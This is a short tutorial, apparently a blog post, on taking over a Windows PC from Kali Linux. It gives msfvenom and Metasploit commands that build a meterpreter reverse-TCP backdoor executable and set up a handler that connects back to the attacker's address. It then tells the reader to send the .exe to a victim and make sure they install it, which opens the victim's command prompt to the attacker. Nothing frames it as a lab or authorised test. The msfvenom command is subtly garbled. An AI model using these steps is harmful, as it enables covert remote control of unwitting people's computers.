Hack Windows PC using Kali Linux

Let us see how to hack and get access to a Windows PC using Kali Linux.


1. For hacking windows we need to create the payload.Start Up your Kali Linux and open terminal and type
msfvenom -p windows/meterpreter/reverse_tcp - platform windows-a x86 -f exe -o /root/Desktop/back.exe
this command will create a payload in the desktop on your machine.



2. Open the Metasploit Framework Console. Type
msfconsole
This metasploit framework console has many payloads and exploit for every attack we need to specify the exploit and the payload



3. Type
use exploit/multi/handler
This command specifies the payload to be used for this attack



4. Type
set payload windows/meterpreter/reverse_tcp
This command specfies the payload that we are using for htis attack



5. Type
set LHOST (ip address of the attacker)
Thsi command will add our machine ip address for backdooring thus the information from the Windows PC will come to this ip address



6. After completing all the above steps you need to send the .exe file to the victim and make sure that the victim install the .exe file. After that type
exploit
After exploiting you can see all the clients that have installed this software and hence you can access their command prompt.
